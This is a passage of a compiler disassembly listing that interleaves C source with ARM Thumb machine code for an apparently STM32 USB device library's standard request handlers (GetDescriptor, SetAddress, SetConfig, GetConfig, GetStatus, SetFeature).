 800bee6:	60f8      	str	r0, [r7, #12]
      else
      {
        USBD_CtlError(pdev, req);
        err++;
      }
      break;
 800bee8:	e029      	b.n	800bf3e <USBD_GetDescriptor+0x2da>
        USBD_CtlError(pdev, req);
 800beea:	6839      	ldr	r1, [r7, #0]
 800beec:	6878      	ldr	r0, [r7, #4]
 800beee:	f000 fa2a 	bl	800c346 <USBD_CtlError>
        err++;
 800bef2:	7afb      	ldrb	r3, [r7, #11]
 800bef4:	3301      	adds	r3, #1
 800bef6:	72fb      	strb	r3, [r7, #11]
      break;
 800bef8:	e021      	b.n	800bf3e <USBD_GetDescriptor+0x2da>

    case USB_DESC_TYPE_OTHER_SPEED_CONFIGURATION:
      if (pdev->dev_speed == USBD_SPEED_HIGH)
 800befa:	687b      	ldr	r3, [r7, #4]
 800befc:	7c1b      	ldrb	r3, [r3, #16]
 800befe:	2b00      	cmp	r3, #0
 800bf00:	d10d      	bne.n	800bf1e <USBD_GetDescriptor+0x2ba>
          pbuf = (uint8_t *)USBD_CMPSIT.GetOtherSpeedConfigDescriptor(&len);
        }
        else
#endif /* USE_USBD_COMPOSITE */
        {
          pbuf = (uint8_t *)pdev->pClass[0]->GetOtherSpeedConfigDescriptor(&len);
 800bf02:	687b      	ldr	r3, [r7, #4]
 800bf04:	f8d3 32b8 	ldr.w	r3, [r3, #696]	; 0x2b8
 800bf08:	6b1b      	ldr	r3, [r3, #48]	; 0x30
 800bf0a:	f107 0208 	add.w	r2, r7, #8
 800bf0e:	4610      	mov	r0, r2
 800bf10:	4798      	blx	r3
 800bf12:	60f8      	str	r0, [r7, #12]
        }
        pbuf[1] = USB_DESC_TYPE_OTHER_SPEED_CONFIGURATION;
 800bf14:	68fb      	ldr	r3, [r7, #12]
 800bf16:	3301      	adds	r3, #1
 800bf18:	2207      	movs	r2, #7
 800bf1a:	701a      	strb	r2, [r3, #0]
      else
      {
        USBD_CtlError(pdev, req);
        err++;
      }
      break;
 800bf1c:	e00f      	b.n	800bf3e <USBD_GetDescriptor+0x2da>
        USBD_CtlError(pdev, req);
 800bf1e:	6839      	ldr	r1, [r7, #0]
 800bf20:	6878      	ldr	r0, [r7, #4]
 800bf22:	f000 fa10 	bl	800c346 <USBD_CtlError>
        err++;
 800bf26:	7afb      	ldrb	r3, [r7, #11]
 800bf28:	3301      	adds	r3, #1
 800bf2a:	72fb      	strb	r3, [r7, #11]
      break;
 800bf2c:	e007      	b.n	800bf3e <USBD_GetDescriptor+0x2da>

    default:
      USBD_CtlError(pdev, req);
 800bf2e:	6839      	ldr	r1, [r7, #0]
 800bf30:	6878      	ldr	r0, [r7, #4]
 800bf32:	f000 fa08 	bl	800c346 <USBD_CtlError>
      err++;
 800bf36:	7afb      	ldrb	r3, [r7, #11]
 800bf38:	3301      	adds	r3, #1
 800bf3a:	72fb      	strb	r3, [r7, #11]
      break;
 800bf3c:	bf00      	nop
  }

  if (err != 0U)
 800bf3e:	7afb      	ldrb	r3, [r7, #11]
 800bf40:	2b00      	cmp	r3, #0
 800bf42:	d11e      	bne.n	800bf82 <USBD_GetDescriptor+0x31e>
  {
    return;
  }

  if (req->wLength != 0U)
 800bf44:	683b      	ldr	r3, [r7, #0]
 800bf46:	88db      	ldrh	r3, [r3, #6]
 800bf48:	2b00      	cmp	r3, #0
 800bf4a:	d016      	beq.n	800bf7a <USBD_GetDescriptor+0x316>
  {
    if (len != 0U)
 800bf4c:	893b      	ldrh	r3, [r7, #8]
 800bf4e:	2b00      	cmp	r3, #0
 800bf50:	d00e      	beq.n	800bf70 <USBD_GetDescriptor+0x30c>
    {
      len = MIN(len, req->wLength);
 800bf52:	683b      	ldr	r3, [r7, #0]
 800bf54:	88da      	ldrh	r2, [r3, #6]
 800bf56:	893b      	ldrh	r3, [r7, #8]
 800bf58:	4293      	cmp	r3, r2
 800bf5a:	bf28      	it	cs
 800bf5c:	4613      	movcs	r3, r2
 800bf5e:	b29b      	uxth	r3, r3
 800bf60:	813b      	strh	r3, [r7, #8]
      (void)USBD_CtlSendData(pdev, pbuf, len);
 800bf62:	893b      	ldrh	r3, [r7, #8]
 800bf64:	461a      	mov	r2, r3
 800bf66:	68f9      	ldr	r1, [r7, #12]
 800bf68:	6878      	ldr	r0, [r7, #4]
 800bf6a:	f000 fa5d 	bl	800c428 <USBD_CtlSendData>
 800bf6e:	e009      	b.n	800bf84 <USBD_GetDescriptor+0x320>
    }
    else
    {
      USBD_CtlError(pdev, req);
 800bf70:	6839      	ldr	r1, [r7, #0]
 800bf72:	6878      	ldr	r0, [r7, #4]
 800bf74:	f000 f9e7 	bl	800c346 <USBD_CtlError>
 800bf78:	e004      	b.n	800bf84 <USBD_GetDescriptor+0x320>
    }
  }
  else
  {
    (void)USBD_CtlSendStatus(pdev);
 800bf7a:	6878      	ldr	r0, [r7, #4]
 800bf7c:	f000 faae 	bl	800c4dc <USBD_CtlSendStatus>
 800bf80:	e000      	b.n	800bf84 <USBD_GetDescriptor+0x320>
    return;
 800bf82:	bf00      	nop
  }
}
 800bf84:	3710      	adds	r7, #16
 800bf86:	46bd      	mov	sp, r7
 800bf88:	bd80      	pop	{r7, pc}
 800bf8a:	bf00      	nop

0800bf8c <USBD_SetAddress>:
  * @param  pdev: device instance
  * @param  req: usb request
  * @retval status
  */
static void USBD_SetAddress(USBD_HandleTypeDef *pdev, USBD_SetupReqTypedef *req)
{
 800bf8c:	b580      	push	{r7, lr}
 800bf8e:	b084      	sub	sp, #16
 800bf90:	af00      	add	r7, sp, #0
 800bf92:	6078      	str	r0, [r7, #4]
 800bf94:	6039      	str	r1, [r7, #0]
  uint8_t  dev_addr;

  if ((req->wIndex == 0U) && (req->wLength == 0U) && (req->wValue < 128U))
 800bf96:	683b      	ldr	r3, [r7, #0]
 800bf98:	889b      	ldrh	r3, [r3, #4]
 800bf9a:	2b00      	cmp	r3, #0
 800bf9c:	d131      	bne.n	800c002 <USBD_SetAddress+0x76>
 800bf9e:	683b      	ldr	r3, [r7, #0]
 800bfa0:	88db      	ldrh	r3, [r3, #6]
 800bfa2:	2b00      	cmp	r3, #0
 800bfa4:	d12d      	bne.n	800c002 <USBD_SetAddress+0x76>
 800bfa6:	683b      	ldr	r3, [r7, #0]
 800bfa8:	885b      	ldrh	r3, [r3, #2]
 800bfaa:	2b7f      	cmp	r3, #127	; 0x7f
 800bfac:	d829      	bhi.n	800c002 <USBD_SetAddress+0x76>
  {
    dev_addr = (uint8_t)(req->wValue) & 0x7FU;
 800bfae:	683b      	ldr	r3, [r7, #0]
 800bfb0:	885b      	ldrh	r3, [r3, #2]
 800bfb2:	b2db      	uxtb	r3, r3
 800bfb4:	f003 037f 	and.w	r3, r3, #127	; 0x7f
 800bfb8:	73fb      	strb	r3, [r7, #15]

    if (pdev->dev_state == USBD_STATE_CONFIGURED)
 800bfba:	687b      	ldr	r3, [r7, #4]
 800bfbc:	f893 329c 	ldrb.w	r3, [r3, #668]	; 0x29c
 800bfc0:	b2db      	uxtb	r3, r3
 800bfc2:	2b03      	cmp	r3, #3
 800bfc4:	d104      	bne.n	800bfd0 <USBD_SetAddress+0x44>
    {
      USBD_CtlError(pdev, req);
 800bfc6:	6839      	ldr	r1, [r7, #0]
 800bfc8:	6878      	ldr	r0, [r7, #4]
 800bfca:	f000 f9bc 	bl	800c346 <USBD_CtlError>
    if (pdev->dev_state == USBD_STATE_CONFIGURED)
 800bfce:	e01d      	b.n	800c00c <USBD_SetAddress+0x80>
    }
    else
    {
      pdev->dev_address = dev_addr;
 800bfd0:	687b      	ldr	r3, [r7, #4]
 800bfd2:	7bfa      	ldrb	r2, [r7, #15]
 800bfd4:	f883 229e 	strb.w	r2, [r3, #670]	; 0x29e
      (void)USBD_LL_SetUSBAddress(pdev, dev_addr);
 800bfd8:	7bfb      	ldrb	r3, [r7, #15]
 800bfda:	4619      	mov	r1, r3
 800bfdc:	6878      	ldr	r0, [r7, #4]
 800bfde:	f000 ffbf 	bl	800cf60 <USBD_LL_SetUSBAddress>
      (void)USBD_CtlSendStatus(pdev);
 800bfe2:	6878      	ldr	r0, [r7, #4]
 800bfe4:	f000 fa7a 	bl	800c4dc <USBD_CtlSendStatus>

      if (dev_addr != 0U)
 800bfe8:	7bfb      	ldrb	r3, [r7, #15]
 800bfea:	2b00      	cmp	r3, #0
 800bfec:	d004      	beq.n	800bff8 <USBD_SetAddress+0x6c>
      {
        pdev->dev_state = USBD_STATE_ADDRESSED;
 800bfee:	687b      	ldr	r3, [r7, #4]
 800bff0:	2202      	movs	r2, #2
 800bff2:	f883 229c 	strb.w	r2, [r3, #668]	; 0x29c
    if (pdev->dev_state == USBD_STATE_CONFIGURED)
 800bff6:	e009      	b.n	800c00c <USBD_SetAddress+0x80>
      }
      else
      {
        pdev->dev_state = USBD_STATE_DEFAULT;
 800bff8:	687b      	ldr	r3, [r7, #4]
 800bffa:	2201      	movs	r2, #1
 800bffc:	f883 229c 	strb.w	r2, [r3, #668]	; 0x29c
    if (pdev->dev_state == USBD_STATE_CONFIGURED)
 800c000:	e004      	b.n	800c00c <USBD_SetAddress+0x80>
      }
    }
  }
  else
  {
    USBD_CtlError(pdev, req);
 800c002:	6839      	ldr	r1, [r7, #0]
 800c004:	6878      	ldr	r0, [r7, #4]
 800c006:	f000 f99e 	bl	800c346 <USBD_CtlError>
  }
}
 800c00a:	bf00      	nop
 800c00c:	bf00      	nop
 800c00e:	3710      	adds	r7, #16
 800c010:	46bd      	mov	sp, r7
 800c012:	bd80      	pop	{r7, pc}

0800c014 <USBD_SetConfig>:
  * @param  pdev: device instance
  * @param  req: usb request
  * @retval status
  */
static USBD_StatusTypeDef USBD_SetConfig(USBD_HandleTypeDef *pdev, USBD_SetupReqTypedef *req)
{
 800c014:	b580      	push	{r7, lr}
 800c016:	b084      	sub	sp, #16
 800c018:	af00      	add	r7, sp, #0
 800c01a:	6078      	str	r0, [r7, #4]
 800c01c:	6039      	str	r1, [r7, #0]
  USBD_StatusTypeDef ret = USBD_OK;
 800c01e:	2300      	movs	r3, #0
 800c020:	73fb      	strb	r3, [r7, #15]
  static uint8_t cfgidx;

  cfgidx = (uint8_t)(req->wValue);
 800c022:	683b      	ldr	r3, [r7, #0]
 800c024:	885b      	ldrh	r3, [r3, #2]
 800c026:	b2da      	uxtb	r2, r3
 800c028:	4b4e      	ldr	r3, [pc, #312]	; (800c164 <USBD_SetConfig+0x150>)
 800c02a:	701a      	strb	r2, [r3, #0]

  if (cfgidx > USBD_MAX_NUM_CONFIGURATION)
 800c02c:	4b4d      	ldr	r3, [pc, #308]	; (800c164 <USBD_SetConfig+0x150>)
 800c02e:	781b      	ldrb	r3, [r3, #0]
 800c030:	2b01      	cmp	r3, #1
 800c032:	d905      	bls.n	800c040 <USBD_SetConfig+0x2c>
  {
    USBD_CtlError(pdev, req);
 800c034:	6839      	ldr	r1, [r7, #0]
 800c036:	6878      	ldr	r0, [r7, #4]
 800c038:	f000 f985 	bl	800c346 <USBD_CtlError>
    return USBD_FAIL;
 800c03c:	2303      	movs	r3, #3
 800c03e:	e08c      	b.n	800c15a <USBD_SetConfig+0x146>
  }

  switch (pdev->dev_state)
 800c040:	687b      	ldr	r3, [r7, #4]
 800c042:	f893 329c 	ldrb.w	r3, [r3, #668]	; 0x29c
 800c046:	b2db      	uxtb	r3, r3
 800c048:	2b02      	cmp	r3, #2
 800c04a:	d002      	beq.n	800c052 <USBD_SetConfig+0x3e>
 800c04c:	2b03      	cmp	r3, #3
 800c04e:	d029      	beq.n	800c0a4 <USBD_SetConfig+0x90>
 800c050:	e075      	b.n	800c13e <USBD_SetConfig+0x12a>
  {
    case USBD_STATE_ADDRESSED:
      if (cfgidx != 0U)
 800c052:	4b44      	ldr	r3, [pc, #272]	; (800c164 <USBD_SetConfig+0x150>)
 800c054:	781b      	ldrb	r3, [r3, #0]
 800c056:	2b00      	cmp	r3, #0
 800c058:	d020      	beq.n	800c09c <USBD_SetConfig+0x88>
      {
        pdev->dev_config = cfgidx;
 800c05a:	4b42      	ldr	r3, [pc, #264]	; (800c164 <USBD_SetConfig+0x150>)
 800c05c:	781b      	ldrb	r3, [r3, #0]
 800c05e:	461a      	mov	r2, r3
 800c060:	687b      	ldr	r3, [r7, #4]
 800c062:	605a      	str	r2, [r3, #4]

        ret = USBD_SetClassConfig(pdev, cfgidx);
 800c064:	4b3f      	ldr	r3, [pc, #252]	; (800c164 <USBD_SetConfig+0x150>)
 800c066:	781b      	ldrb	r3, [r3, #0]
 800c068:	4619      	mov	r1, r3
 800c06a:	6878      	ldr	r0, [r7, #4]
 800c06c:	f7ff f848 	bl	800b100 <USBD_SetClassConfig>
 800c070:	4603      	mov	r3, r0
 800c072:	73fb      	strb	r3, [r7, #15]

        if (ret != USBD_OK)
 800c074:	7bfb      	ldrb	r3, [r7, #15]
 800c076:	2b00      	cmp	r3, #0
 800c078:	d008      	beq.n	800c08c <USBD_SetConfig+0x78>
        {
          USBD_CtlError(pdev, req);
 800c07a:	6839      	ldr	r1, [r7, #0]
 800c07c:	6878      	ldr	r0, [r7, #4]
 800c07e:	f000 f962 	bl	800c346 <USBD_CtlError>
          pdev->dev_state = USBD_STATE_ADDRESSED;
 800c082:	687b      	ldr	r3, [r7, #4]
 800c084:	2202      	movs	r2, #2
 800c086:	f883 229c 	strb.w	r2, [r3, #668]	; 0x29c
      }
      else
      {
        (void)USBD_CtlSendStatus(pdev);
      }
      break;
 800c08a:	e065      	b.n	800c158 <USBD_SetConfig+0x144>
          (void)USBD_CtlSendStatus(pdev);
 800c08c:	6878      	ldr	r0, [r7, #4]
 800c08e:	f000 fa25 	bl	800c4dc <USBD_CtlSendStatus>
          pdev->dev_state = USBD_STATE_CONFIGURED;
 800c092:	687b      	ldr	r3, [r7, #4]
 800c094:	2203      	movs	r2, #3
 800c096:	f883 229c 	strb.w	r2, [r3, #668]	; 0x29c
      break;
 800c09a:	e05d      	b.n	800c158 <USBD_SetConfig+0x144>
        (void)USBD_CtlSendStatus(pdev);
 800c09c:	6878      	ldr	r0, [r7, #4]
 800c09e:	f000 fa1d 	bl	800c4dc <USBD_CtlSendStatus>
      break;
 800c0a2:	e059      	b.n	800c158 <USBD_SetConfig+0x144>

    case USBD_STATE_CONFIGURED:
      if (cfgidx == 0U)
 800c0a4:	4b2f      	ldr	r3, [pc, #188]	; (800c164 <USBD_SetConfig+0x150>)
 800c0a6:	781b      	ldrb	r3, [r3, #0]
 800c0a8:	2b00      	cmp	r3, #0
 800c0aa:	d112      	bne.n	800c0d2 <USBD_SetConfig+0xbe>
      {
        pdev->dev_state = USBD_STATE_ADDRESSED;
 800c0ac:	687b      	ldr	r3, [r7, #4]
 800c0ae:	2202      	movs	r2, #2
 800c0b0:	f883 229c 	strb.w	r2, [r3, #668]	; 0x29c
        pdev->dev_config = cfgidx;
 800c0b4:	4b2b      	ldr	r3, [pc, #172]	; (800c164 <USBD_SetConfig+0x150>)
 800c0b6:	781b      	ldrb	r3, [r3, #0]
 800c0b8:	461a      	mov	r2, r3
 800c0ba:	687b      	ldr	r3, [r7, #4]
 800c0bc:	605a      	str	r2, [r3, #4]
        (void)USBD_ClrClassConfig(pdev, cfgidx);
 800c0be:	4b29      	ldr	r3, [pc, #164]	; (800c164 <USBD_SetConfig+0x150>)
 800c0c0:	781b      	ldrb	r3, [r3, #0]
 800c0c2:	4619      	mov	r1, r3
 800c0c4:	6878      	ldr	r0, [r7, #4]
 800c0c6:	f7ff f837 	bl	800b138 <USBD_ClrClassConfig>
        (void)USBD_CtlSendStatus(pdev);
 800c0ca:	6878      	ldr	r0, [r7, #4]
 800c0cc:	f000 fa06 	bl	800c4dc <USBD_CtlSendStatus>
      }
      else
      {
        (void)USBD_CtlSendStatus(pdev);
      }
      break;
 800c0d0:	e042      	b.n	800c158 <USBD_SetConfig+0x144>
      else if (cfgidx != pdev->dev_config)
 800c0d2:	4b24      	ldr	r3, [pc, #144]	; (800c164 <USBD_SetConfig+0x150>)
 800c0d4:	781b      	ldrb	r3, [r3, #0]
 800c0d6:	461a      	mov	r2, r3
 800c0d8:	687b      	ldr	r3, [r7, #4]
 800c0da:	685b      	ldr	r3, [r3, #4]
 800c0dc:	429a      	cmp	r2, r3
 800c0de:	d02a      	beq.n	800c136 <USBD_SetConfig+0x122>
        (void)USBD_ClrClassConfig(pdev, (uint8_t)pdev->dev_config);
 800c0e0:	687b      	ldr	r3, [r7, #4]
 800c0e2:	685b      	ldr	r3, [r3, #4]
 800c0e4:	b2db      	uxtb	r3, r3
 800c0e6:	4619      	mov	r1, r3
 800c0e8:	6878      	ldr	r0, [r7, #4]
 800c0ea:	f7ff f825 	bl	800b138 <USBD_ClrClassConfig>
        pdev->dev_config = cfgidx;
 800c0ee:	4b1d      	ldr	r3, [pc, #116]	; (800c164 <USBD_SetConfig+0x150>)
 800c0f0:	781b      	ldrb	r3, [r3, #0]
 800c0f2:	461a      	mov	r2, r3
 800c0f4:	687b      	ldr	r3, [r7, #4]
 800c0f6:	605a      	str	r2, [r3, #4]
        ret = USBD_SetClassConfig(pdev, cfgidx);
 800c0f8:	4b1a      	ldr	r3, [pc, #104]	; (800c164 <USBD_SetConfig+0x150>)
 800c0fa:	781b      	ldrb	r3, [r3, #0]
 800c0fc:	4619      	mov	r1, r3
 800c0fe:	6878      	ldr	r0, [r7, #4]
 800c100:	f7fe fffe 	bl	800b100 <USBD_SetClassConfig>
 800c104:	4603      	mov	r3, r0
 800c106:	73fb      	strb	r3, [r7, #15]
        if (ret != USBD_OK)
 800c108:	7bfb      	ldrb	r3, [r7, #15]
 800c10a:	2b00      	cmp	r3, #0
 800c10c:	d00f      	beq.n	800c12e <USBD_SetConfig+0x11a>
          USBD_CtlError(pdev, req);
 800c10e:	6839      	ldr	r1, [r7, #0]
 800c110:	6878      	ldr	r0, [r7, #4]
 800c112:	f000 f918 	bl	800c346 <USBD_CtlError>
          (void)USBD_ClrClassConfig(pdev, (uint8_t)pdev->dev_config);
 800c116:	687b      	ldr	r3, [r7, #4]
 800c118:	685b      	ldr	r3, [r3, #4]
 800c11a:	b2db      	uxtb	r3, r3
 800c11c:	4619      	mov	r1, r3
 800c11e:	6878      	ldr	r0, [r7, #4]
 800c120:	f7ff f80a 	bl	800b138 <USBD_ClrClassConfig>
          pdev->dev_state = USBD_STATE_ADDRESSED;
 800c124:	687b      	ldr	r3, [r7, #4]
 800c126:	2202      	movs	r2, #2
 800c128:	f883 229c 	strb.w	r2, [r3, #668]	; 0x29c
      break;
 800c12c:	e014      	b.n	800c158 <USBD_SetConfig+0x144>
          (void)USBD_CtlSendStatus(pdev);
 800c12e:	6878      	ldr	r0, [r7, #4]
 800c130:	f000 f9d4 	bl	800c4dc <USBD_CtlSendStatus>
      break;
 800c134:	e010      	b.n	800c158 <USBD_SetConfig+0x144>
        (void)USBD_CtlSendStatus(pdev);
 800c136:	6878      	ldr	r0, [r7, #4]
 800c138:	f000 f9d0 	bl	800c4dc <USBD_CtlSendStatus>
      break;
 800c13c:	e00c      	b.n	800c158 <USBD_SetConfig+0x144>

    default:
      USBD_CtlError(pdev, req);
 800c13e:	6839      	ldr	r1, [r7, #0]
 800c140:	6878      	ldr	r0, [r7, #4]
 800c142:	f000 f900 	bl	800c346 <USBD_CtlError>
      (void)USBD_ClrClassConfig(pdev, cfgidx);
 800c146:	4b07      	ldr	r3, [pc, #28]	; (800c164 <USBD_SetConfig+0x150>)
 800c148:	781b      	ldrb	r3, [r3, #0]
 800c14a:	4619      	mov	r1, r3
 800c14c:	6878      	ldr	r0, [r7, #4]
 800c14e:	f7fe fff3 	bl	800b138 <USBD_ClrClassConfig>
      ret = USBD_FAIL;
 800c152:	2303      	movs	r3, #3
 800c154:	73fb      	strb	r3, [r7, #15]
      break;
 800c156:	bf00      	nop
  }

  return ret;
 800c158:	7bfb      	ldrb	r3, [r7, #15]
}
 800c15a:	4618      	mov	r0, r3
 800c15c:	3710      	adds	r7, #16
 800c15e:	46bd      	mov	sp, r7
 800c160:	bd80      	pop	{r7, pc}
 800c162:	bf00      	nop
 800c164:	200003bc 	.word	0x200003bc

0800c168 <USBD_GetConfig>:
  * @param  pdev: device instance
  * @param  req: usb request
  * @retval status
  */
static void USBD_GetConfig(USBD_HandleTypeDef *pdev, USBD_SetupReqTypedef *req)
{
 800c168:	b580      	push	{r7, lr}
 800c16a:	b082      	sub	sp, #8
 800c16c:	af00      	add	r7, sp, #0
 800c16e:	6078      	str	r0, [r7, #4]
 800c170:	6039      	str	r1, [r7, #0]
  if (req->wLength != 1U)
 800c172:	683b      	ldr	r3, [r7, #0]
 800c174:	88db      	ldrh	r3, [r3, #6]
 800c176:	2b01      	cmp	r3, #1
 800c178:	d004      	beq.n	800c184 <USBD_GetConfig+0x1c>
  {
    USBD_CtlError(pdev, req);
 800c17a:	6839      	ldr	r1, [r7, #0]
 800c17c:	6878      	ldr	r0, [r7, #4]
 800c17e:	f000 f8e2 	bl	800c346 <USBD_CtlError>
      default:
        USBD_CtlError(pdev, req);
        break;
    }
  }
}
 800c182:	e023      	b.n	800c1cc <USBD_GetConfig+0x64>
    switch (pdev->dev_state)
 800c184:	687b      	ldr	r3, [r7, #4]
 800c186:	f893 329c 	ldrb.w	r3, [r3, #668]	; 0x29c
 800c18a:	b2db      	uxtb	r3, r3
 800c18c:	2b02      	cmp	r3, #2
 800c18e:	dc02      	bgt.n	800c196 <USBD_GetConfig+0x2e>
 800c190:	2b00      	cmp	r3, #0
 800c192:	dc03      	bgt.n	800c19c <USBD_GetConfig+0x34>
 800c194:	e015      	b.n	800c1c2 <USBD_GetConfig+0x5a>
 800c196:	2b03      	cmp	r3, #3
 800c198:	d00b      	beq.n	800c1b2 <USBD_GetConfig+0x4a>
 800c19a:	e012      	b.n	800c1c2 <USBD_GetConfig+0x5a>
        pdev->dev_default_config = 0U;
 800c19c:	687b      	ldr	r3, [r7, #4]
 800c19e:	2200      	movs	r2, #0
 800c1a0:	609a      	str	r2, [r3, #8]
        (void)USBD_CtlSendData(pdev, (uint8_t *)&pdev->dev_default_config, 1U);
 800c1a2:	687b      	ldr	r3, [r7, #4]
 800c1a4:	3308      	adds	r3, #8
 800c1a6:	2201      	movs	r2, #1
 800c1a8:	4619      	mov	r1, r3
 800c1aa:	6878      	ldr	r0, [r7, #4]
 800c1ac:	f000 f93c 	bl	800c428 <USBD_CtlSendData>
        break;
 800c1b0:	e00c      	b.n	800c1cc <USBD_GetConfig+0x64>
        (void)USBD_CtlSendData(pdev, (uint8_t *)&pdev->dev_config, 1U);
 800c1b2:	687b      	ldr	r3, [r7, #4]
 800c1b4:	3304      	adds	r3, #4
 800c1b6:	2201      	movs	r2, #1
 800c1b8:	4619      	mov	r1, r3
 800c1ba:	6878      	ldr	r0, [r7, #4]
 800c1bc:	f000 f934 	bl	800c428 <USBD_CtlSendData>
        break;
 800c1c0:	e004      	b.n	800c1cc <USBD_GetConfig+0x64>
        USBD_CtlError(pdev, req);
 800c1c2:	6839      	ldr	r1, [r7, #0]
 800c1c4:	6878      	ldr	r0, [r7, #4]
 800c1c6:	f000 f8be 	bl	800c346 <USBD_CtlError>
        break;
 800c1ca:	bf00      	nop
}
 800c1cc:	bf00      	nop
 800c1ce:	3708      	adds	r7, #8
 800c1d0:	46bd      	mov	sp, r7
 800c1d2:	bd80      	pop	{r7, pc}

0800c1d4 <USBD_GetStatus>:
  * @param  pdev: device instance
  * @param  req: usb request
  * @retval status
  */
static void USBD_GetStatus(USBD_HandleTypeDef *pdev, USBD_SetupReqTypedef *req)
{
 800c1d4:	b580      	push	{r7, lr}
 800c1d6:	b082      	sub	sp, #8
 800c1d8:	af00      	add	r7, sp, #0
 800c1da:	6078      	str	r0, [r7, #4]
 800c1dc:	6039      	str	r1, [r7, #0]
  switch (pdev->dev_state)
 800c1de:	687b      	ldr	r3, [r7, #4]
 800c1e0:	f893 329c 	ldrb.w	r3, [r3, #668]	; 0x29c
 800c1e4:	b2db      	uxtb	r3, r3
 800c1e6:	3b01      	subs	r3, #1
 800c1e8:	2b02      	cmp	r3, #2
 800c1ea:	d81e      	bhi.n	800c22a <USBD_GetStatus+0x56>
  {
    case USBD_STATE_DEFAULT:
    case USBD_STATE_ADDRESSED:
    case USBD_STATE_CONFIGURED:
      if (req->wLength != 0x2U)
 800c1ec:	683b      	ldr	r3, [r7, #0]
 800c1ee:	88db      	ldrh	r3, [r3, #6]
 800c1f0:	2b02      	cmp	r3, #2
 800c1f2:	d004      	beq.n	800c1fe <USBD_GetStatus+0x2a>
      {
        USBD_CtlError(pdev, req);
 800c1f4:	6839      	ldr	r1, [r7, #0]
 800c1f6:	6878      	ldr	r0, [r7, #4]
 800c1f8:	f000 f8a5 	bl	800c346 <USBD_CtlError>
        break;
 800c1fc:	e01a      	b.n	800c234 <USBD_GetStatus+0x60>
      }

#if (USBD_SELF_POWERED == 1U)
      pdev->dev_config_status = USB_CONFIG_SELF_POWERED;
 800c1fe:	687b      	ldr	r3, [r7, #4]
 800c200:	2201      	movs	r2, #1
 800c202:	60da      	str	r2, [r3, #12]
#else
      pdev->dev_config_status = 0U;
#endif /* USBD_SELF_POWERED */

      if (pdev->dev_remote_wakeup != 0U)
 800c204:	687b      	ldr	r3, [r7, #4]
 800c206:	f8d3 32a4 	ldr.w	r3, [r3, #676]	; 0x2a4
 800c20a:	2b00      	cmp	r3, #0
 800c20c:	d005      	beq.n	800c21a <USBD_GetStatus+0x46>
      {
        pdev->dev_config_status |= USB_CONFIG_REMOTE_WAKEUP;
 800c20e:	687b      	ldr	r3, [r7, #4]
 800c210:	68db      	ldr	r3, [r3, #12]
 800c212:	f043 0202 	orr.w	r2, r3, #2
 800c216:	687b      	ldr	r3, [r7, #4]
 800c218:	60da      	str	r2, [r3, #12]
      }

      (void)USBD_CtlSendData(pdev, (uint8_t *)&pdev->dev_config_status, 2U);
 800c21a:	687b      	ldr	r3, [r7, #4]
 800c21c:	330c      	adds	r3, #12
 800c21e:	2202      	movs	r2, #2
 800c220:	4619      	mov	r1, r3
 800c222:	6878      	ldr	r0, [r7, #4]
 800c224:	f000 f900 	bl	800c428 <USBD_CtlSendData>
      break;
 800c228:	e004      	b.n	800c234 <USBD_GetStatus+0x60>

    default:
      USBD_CtlError(pdev, req);
 800c22a:	6839      	ldr	r1, [r7, #0]
 800c22c:	6878      	ldr	r0, [r7, #4]
 800c22e:	f000 f88a 	bl	800c346 <USBD_CtlError>
      break;
 800c232:	bf00      	nop
  }
}
 800c234:	bf00      	nop
 800c236:	3708      	adds	r7, #8
 800c238:	46bd      	mov	sp, r7
 800c23a:	bd80      	pop	{r7, pc}

0800c23c <USBD_SetFeature>:
  * @param  pdev: device instance
  * @param  req: usb request
  * @retval status
  */
static void USBD_SetFeature(USBD_HandleTypeDef *pdev, USBD_SetupReqTypedef *req)
{
 800c23c:	b580      	push	{r7, lr}
 800c23e:	b082      	sub	sp, #8
 800c240:	af00      	add	r7, sp, #0
 800c242:	6078      	str	r0, [r7, #4]
 800c244:	6039      	str	r1, [r7, #0]
  if (req->wValue == USB_FEATURE_REMOTE_WAKEUP)
 800c246:	683b      	ldr	r3, [r7, #0]
 800c248:	885b      	ldrh	r3, [r3, #2]
 800c24a:	2b01      	cmp	r3, #1
 800c24c:	d107      	bne.n	800c25e <USBD_SetFeature+0x22>
  {
    pdev->dev_remote_wakeup = 1U;
 800c24e:	687b      	ldr	r3, [r7, #4]
 800c250:	2201      	movs	r2, #1
 800c252:	f8c3 22a4 	str.w	r2, [r3, #676]	; 0x2a4
    (void)USBD_CtlSendStatus(pdev);
 800c256:	6878      	ldr	r0, [r7, #4]
 800c258:	f000 f940 	bl	800c4dc <USBD_CtlSendStatus>
  }
  else
  {
    USBD_CtlError(pdev, req);
  }
}
 800c25c:	e013      	b.n	800c286 <USBD_SetFeature+0x4a>
  else if (req->wValue == USB_FEATURE_TEST_MODE)
 800c25e:	683b      	ldr	r3, [r7, #0]
 800c260:	885b      	ldrh	r3, [r3, #2]
 800c262:	2b02      	cmp	r3, #2
 800c264:	d10b      	bne.n	800c27e <USBD_SetFeature+0x42>
    pdev->dev_test_mode = (uint8_t)(req->wIndex >> 8);
 800c266:	683b      	ldr	r3, [r7, #0]
 800c268:	889b      	ldrh	r3, [r3, #4]
 800c26a:	0a1b      	lsrs	r3, r3, #8
 800c26c:	b29b      	uxth	r3, r3
 800c26e:	b2da      	uxtb	r2, r3
 800c270:	687b      	ldr	r3, [r7, #4]
 800c272:	f883 22a0 	strb.w	r2, [r3, #672]	; 0x2a0
    (void)USBD_CtlSendStatus(pdev);
 800c276:	6878      	ldr	r0, [r7, #4]
 800c278:	f000 f930 	bl	800c4dc <USBD_CtlSendStatus>
}
 800c27c:	e003      	b.n	800c286 <USBD_SetFeature+0x4a>
    USBD_CtlError(pdev, req);
 800c27e:	6839      	ldr	r1, [r7, #0]
 800c280:	6878      	ldr	r0, [r7, #4]
 800c282:	f000 f860 	bl	800c346 <USBD_CtlError>
}
 800c286:	bf00      	nop
 800c288:	3708      	adds	r7, #8
 800c28a:	46bd      	mov	sp, r7
 800c28c:	bd80      	pop	{r7, pc}

0800c28e <USBD_ClrFeature>:
  * @param  pdev: device instance
  * @param  req: usb request
  * @retval status
  */
static void USBD_ClrFeature(USBD_HandleTypeDef *pdev, USBD_SetupReqTypedef *req)
{
 800c28e:	b580      	push	{r7, lr}
 800c290:	b082      	sub	sp, #8
 800c292:	af00      	add	r7, sp, #0
 800c294:	6078      	str	r0, [r7, #4]
 800c296:	6039      	str	r1, [r7, #0]
  switch (pdev->dev_state)
 800c298:	687b      	ldr	r3, [r7, #4]
 800c29a:	f893 329c 	ldrb.w	r3, [r3, #668]	; 0x29c
 800c29e:	b2db      	uxtb	r3, r3
